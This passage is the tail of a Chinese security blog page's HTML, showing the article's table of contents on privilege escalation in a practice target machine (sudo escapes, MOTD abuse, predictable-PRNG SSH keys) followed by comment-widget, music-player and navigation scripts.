toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-sudo-%E4%B8%8D%E6%8B%A6%E6%88%AA%EF%BC%9F"><span class="toc-number">3.8.1.1.</span> <span class="toc-text">为什么 sudo 不拦截？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%AA%E4%BA%9B%E7%A8%8B%E5%BA%8F%E6%9C%89-%E9%80%83%E9%80%B8"><span class="toc-number">3.8.1.2.</span> <span class="toc-text">哪些程序有 ! 逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">3.8.1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8MOTD%E6%9C%BA%E5%88%B6%E6%8F%90%E6%9D%83"><span class="toc-number">3.9.</span> <span class="toc-text">利用MOTD机制提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E9%A2%84%E6%B5%8BPRNG%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3SSH%E6%8F%90%E6%9D%83"><span class="toc-number">3.10.</span> <span class="toc-text">可预测PRNG暴力破解SSH提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E5%85%AC%E9%92%A5%E4%BF%A1%E6%81%AF%E7%A0%B4%E8%A7%A3%E5%87%BA%E7%A7%81%E9%92%A5%EF%BC%88%E7%B2%BE%EF%BC%89"><span class="toc-number">3.10.1.</span> <span class="toc-text">用公钥信息破解出私钥（精）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%85%AC%E7%A7%81%E9%92%A5%E5%AF%B9%E5%BA%93"><span class="toc-number">3.10.2.</span> <span class="toc-text">下载公私钥对库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%8E%8B%E7%BC%A9"><span class="toc-number">3.10.3.</span> <span class="toc-text">解压缩</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8authorized-keys%E7%9A%84%E5%85%AC%E9%92%A5%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2"><span class="toc-number">3.10.4.</span> <span class="toc-text">用authorized_keys的公钥进行搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%84%E7%90%86ssh%E7%99%BB%E5%BD%95%E5%8F%82%E6%95%B0%E9%97%AE%E9%A2%98%EF%BC%88%E7%B2%BE%EF%BC%89"><span class="toc-number">3.10.5.</span> <span class="toc-text">处理ssh登录参数问题（精）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E9%94%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">3.10.6.</span> <span class="toc-text">主键类型的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pubkey%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">3.10.7.</span> <span class="toc-text">pubkey的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%8F%AF%E8%83%BD%E9%81%87%E8%A7%81%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">3.10.8.</span> <span class="toc-text">其他可能遇见的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B%E6%9D%83%E9%99%90shell"><span class="toc-number">3.10.8.1.</span> <span class="toc-text">获得初始权限shell</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2025/12/27/靶机精讲：CONNECT-THE-DOTS/">靶机精讲：CONNECT THE DOTS</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2025/12/27/111/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello~大噶好。唔系可乐爱宅着，欢迎你们来到我的博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">蜀ICP备2022005384号-1</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"安河桥","artist":"宋冬野","url":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
